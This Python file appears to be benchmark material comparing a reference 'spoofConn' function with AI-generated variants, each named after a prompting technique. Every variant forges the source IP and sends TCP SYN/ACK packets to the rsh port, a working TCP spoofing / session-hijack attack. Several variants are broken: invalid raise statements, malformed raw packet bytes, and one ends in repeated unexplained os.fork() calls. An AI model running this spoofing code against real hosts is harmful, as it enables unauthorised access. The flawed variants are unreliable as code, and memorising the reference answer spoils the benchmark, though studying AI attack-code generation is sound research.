import socket
from scapy.all import IP, TCP, send, ICMP
from scapy.all import *

def ground_truth_code_spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)


def persona_spoofConn(src, tgt, ack):
    packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="SA") / Raw(load="x")
    packet.show()
    send(packet, verbose=0)
    packet_ack = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="A", ack=ack) / Raw(load="x")
    send(packet_ack, verbose=0)

def template_spoofConn(src, tgt, ack):
    try:
        from scapy.all import IP, TCP, send
        pkt = IP(src=src, dst=tgt)/TCP(sport=513, dport=514,flags="SA", seq=ack)
        send(pkt, verbose=0)
    except Exception as e:
        raise(f"Error: {e}")
        
def question_refinement_spoofConn(src, tgt, ack):
    import random
    import struct
    import socket
    src_list = [src]
    tgt_list = [tgt]
    for src_ip in src_list:
        for tgt_ip in tgt_list:
            src_port = 513
            dst_port = 514
            seq = random.randint(1, 1000)
            SYN = IP(src=src_ip, dst=tgt_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=seq)
            send(SYN, verbose=False)
            ack = seq + 1
            ACK = IP(src=src_ip, dst=tgt_ip)/TCP(sport=src_port, dport=dst_port, flags="A", seq=seq+1, ack=ack)
            send(ACK, verbose=False)
            
def alternative_approaches_spoofConn(src, tgt, ack):
    import random
    import struct
    import socket
    from scapy.all import IP, TCP, send
    src_port = 513
    tgt_port = 514
    seq = random.randint(1, 1000)
    packet = IP(src=src, dst=tgt)/TCP(sport=src_port, dport=tgt_port, flags="S", seq=seq)
    send(packet, verbose=0)
    seq = seq + 1
    packet = IP(src=src, dst=tgt)/TCP(sport=src_port, dport=tgt_port, flags="A", seq=seq, ack=ack)
    send(packet, verbose=0)
    tgt_port = 514
    seq = random.randint(1, 1000)
    packet = IP(src=tgt, dst=src)/TCP(sport=tgt_port, dport=src_port, flags="S", seq=seq)
    send(packet, verbose=0)
    seq = seq + 1
    packet = IP(src=tgt, dst=src)/TCP(sport=tgt_port, dport=src_port, flags="A", seq=seq, ack=ack)
    send(packet, verbose=0)
    pid = (os.fork())
    pid = (os.fork())
    pid = os.fork()
    pid = os.fork()
    
def context_manager_spoofConn(src, tgt, ack):
    # Creazione del pacchetto SYN (SYN handshake)
    packet1 = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="S")
    
    # Creazione del pacchetto SYN+ACK (risposta a SYN, include l'ACK)
    packet2 = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="SA", seq=1, ack=ack)
    
    # Invia i pacchetti
    send(packet1, verbose=0)
    send(packet2, verbose=0)
    
    # Creazione del socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((src, 513))
    sock.connect((tgt, 514))
    sock.close()
   
def flipped_interaction_3__spoofConn(src, tgt, ack):
	from scapy.all import TCP, IP, send
	syn_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S', seq=500)
	send(syn_pkt, verbose=0)
	ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', seq=501, ack=ack)
	send(ack_pkt, verbose=0)
     
def flipped_interaction_4__spoofConn(src, tgt, ack):
    from scapy.all import IP, TCP
    try:
        packet = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags="S", ack=0, seq=0)
        packet.send()
        packet = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags="A", ack=ack, seq=1)
        packet.send()
    except Exception as e:
        raise(f"Error sending packet: {e}")

def flipped_interaction_5__spoofConn(src, tgt, ack):
    syn_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="S")
    send(syn_packet, verbose=0)
    ack_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags="A", ack=ack)
    send(ack_packet, verbose=0)
    
def iterative_prompting_3__spoofConn(src, tgt, ack):
    import socket
    import struct
    if not isinstance(src, str) or not isinstance(tgt, str) or not isinstance(ack, int):
        raise ValueError("Invalid input type")
    if len(src) == 0 or len(tgt) == 0:
        raise ValueError("Source and target IP addresses cannot be empty")
    tyt_src = src.split(".")
    tyt_tgt = tgt.split(".")
    if len(src.split(".")) != 4 or len(tgt.split(".")) != 4:
        raise ValueError("Invalid IP address format")
    for i in range(4):
        if tyt_src[i] == "" or tyt_tgt[i] == "" or not tyt_src[i].isdigit() or not tyt_tgt[i].isdigit():
            raise ValueError("Invalid IP address format")
        if int(tyt_src[i]) < 0 or int(tyt_src[i]) > 255 or int(tyt_tgt[i]) < 0 or int(tyt_tgt[i]) > 255:
            raise ValueError("Invalid IP address format")
    sky_packet = b"\x45\x00\x28\x5b\xb8\x40\x00\x40\x06\x00\x00"
    sky_packet += struct.pack("!4s", socket.inet_aton(tgt))
    sky_packet += struct.pack("!4s", socket.inet_aton(src))
    sky_packet += b"\x00\x14\x01\x02"
    sky_packet += b"\x70\x00" + struct.pack("!H", ack) + b"\x12\x34\x56\x78"
    sky_packet += b"\x80\x10\x00\x01"
    sky_packet += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"
    sky_packet_first = sky_packet
    sky_packet = b"\x45\x00\x28\x5b\xb8\x40\x00\x40\x06\x00\x00"
    sky_packet += struct.pack("!4s", socket.inet_aton(tgt))
    sky_packet += struct.pack("!4s", socket.inet_aton(src))
    sky_packet += b"\x00\x14\x01\x02"
    sky_packet += b"\x70\x00" + struct.pack("!H", ack + 1) + b"\xa0\x50\x12\x34\x56\x78"
    sky_packet += b"\x50\x00" + struct.pack("!L", (2 << 8) | 2) + b"\x00\x00\x00\x00"
    sky_packet += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    try:
        s.sendto(sky_packet_first, (tgt, 0))
    except OSError as e:
        raise(f"Error sending packet: {e}")
    try:
        s.sendto(sky_packet_first, (tgt, 0))
    except OSError as e:
        raise(f"Error sending packet: {e}")
    s.close()
    sky_packet_first = b"\x45\x00\x28\x5b\xb8\x40\x00\x40\x06\x00\x00"
    sky_packet_first += struct.pack("!4s", socket.inet_aton(tgt))
    sky_packet_first += struct.pack("!4s", socket.inet_aton(src))
    sky_packet_first += b"\x00\x14\x01\x02"
    sky_packet_first += b"\x70\x00" + struct.pack("!H", ack) + b"\x12\x34\x56\x78"
    sky_packet_first += b"\x80\x18\x00\x01"
    sky_packet_first += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"
    sky_packet = b"\x45\x00\x28\x5b\xb8\x40\x00\x40\x06\x00\x00"
    sky_packet += struct.pack("!4s", socket.inet_aton(tgt))
    sky_packet += struct.pack("!4s", socket.inet_aton(src))
    sky_packet += b"\x00\x14\x01\x02"
    sky_packet += b"\x70\x00" + struct.pack("!H", ack + 1) + b"\xa0\x50\x12\x34\x56\x78"
    sky_packet += b"\x50\x10" + struct.pack("!L", (2 << 8) | 2) + b"\x00\x00\x00\x00"
    sky_packet += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    try:
        s.sendto(sky_packet_first, (tgt, 0))
    except OSError as e:
        raise(f"Error sending packet: {e}")
    try:
        s.sendto(sky_packet_first, (tgt, 0))
    except OSError as e:
        raise(f"Error sending packet: {e}")
    s.close()


def iterative_prompting_4__spoofConn(src, tgt, ack):
	if not isinstance(src, str) or not isinstance(tgt, str) or not isinstance(ack, int):
		raise TypeError("Source and target IP addresses must be strings and ack must be an integer")
	try:
		syn_packet = IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags='S', seq=42, ttl=64)
		resp1 = sr1(syn_packet, verbose=0, timeout=2, retry=2, multi=1)
	except (Scapy_Exception, OSError, socket.error) as e:
		raise Exception(f"Failed to send SYN packet: {e.__class__.__name__}: {e}")
	try:
		if resp1 is not None and resp1.haslayer(TCP) and resp1.getlayer(TCP).flags == 0x12:
			ack_packet = IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags='A', seq=resp1.seq + 1, ack=ack, ttl=64)
			sr(ack_packet, verbose=0, timeout=2, retry=2, multi=1)
		elif resp1 is not None and resp1.haslayer(ICMP):
			if resp1.getlayer(ICMP).type == 3 and resp1.getlayer(ICMP).code in (1, 2, 3, 4, 9, 10, 13):
				raise Exception("Target is unreachable")
		else:
			raise Exception(f"Unexpected ICMP response: {resp1.getlayer(ICMP).type}")
	except (Scapy_Exception, OSError, socket.error) as e:
		raise Exception(f"Failed to send ACK packet: {e.__class__.__name__}: {e}")
     
def iterative_prompting_5__spoofConn(src, tgt, ack):
    if not isinstance(src, str) or not isinstance(tgt, str):
        raise TypeError('Source and target addresses must be strings')
    if not isinstance(ack, int):
        raise TypeError('ACK value must be an integer')
    try:
        if len(struct.pack('!HHLLBBHHH', 513, 514, 0, ack, 0x6002, 1024, 0, 14600, 0)) > 20:
            raise ValueError('Invalid packet structure')
        packet = struct.pack('!HHLLBBHHH', 513, 514, 0, ack, 0x6002, 1024, 0, 14600, 0) \
            + b'\x02\x04\x05\xb4\x01\x03\x03\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00'
        if len(packet)!= 32:
            raise ValueError('Invalid packet length')
    except struct.error as e:
        raise ValueError('Invalid packet structure') from e
    except Exception as e:
        raise RuntimeError('Failed to construct packet') from e
    
def few_shots_prompting_spoofConn(src, tgt, ack):
    send(IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags="SA"))
    send(IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags="A", ack=ack))
    
def cot_prompting_spoofConn(src, tgt, ack):
	from scapy.all import IP, TCP, send
	pkt1 = IP(src=src, dst=tgt)/TCP(dport=514, flags='S', seq=42)
	send(pkt1)
	pkt2 = IP(src=src, dst=tgt)/TCP(dport=514, flags='A', seq=42, ack=ack)
	send(pkt2)
     
def fact_check_list_spoofConn(src, tgt, ack):
    syn_pkt = IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags="S")
    send(syn_pkt, verbose=0)
    ack_pkt = IP(src=src, dst=tgt) / TCP(dport=514, sport=513, flags="A", ack=ack)
    send(ack_pkt, verbose=0)
    
def not_interactive_mix_spoofConn(src, tgt, ack):
	try:
		from scapy.all import IP, TCP
		syn_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S', ack=0)
		syn_pkt.send()
		ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', ack=ack)
		ack_pkt.send()
	except Exception as e:
		raise(f"An error occurred: {e}")
        
def interactive_mix_spoofConn(src, tgt, ack, iface='eth0', count=1):
    from scapy.all import IP, TCP, send
    if not isinstance(src, str) or not isinstance(tgt, str):
        raise TypeError("Source and target IP addresses must be strings")
    if not is_valid_ip(src) or not is_valid_ip(tgt):
        raise ValueError("Invalid source or target IP address")
    if not isinstance(ack, int) or ack < 0 or ack > 2**32 - 1:
        raise ValueError("Invalid acknowledgment number")
    if not isinstance(iface, str):
        raise TypeError("Network interface must be a string")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("Count must be a positive integer")
    try:
        syn_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
        ack_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', ack=ack)
    except Exception as e:
        raise Exception(f"Failed to craft packets: {{str(e)}}")
    try:
        send(syn_packet, iface=iface, count=count, verbose=False)
        send(ack_packet, iface=iface, count=count, verbose=False)
    except Exception as e:
        raise Exception(f"Failed to send packets: {{str(e)}}")
def is_valid_ip(ip):
    try:
        import ipaddress
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def baseline_spoofConn(src, tgt, ack):
    from scapy.all import IP, TCP, sr1
    packet = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags="SA", seq=12345, ack=ack)
    send(packet, verbose=0)
    packet = IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags="A", seq=12346, ack=ack+1)
    send(packet, verbose=0)


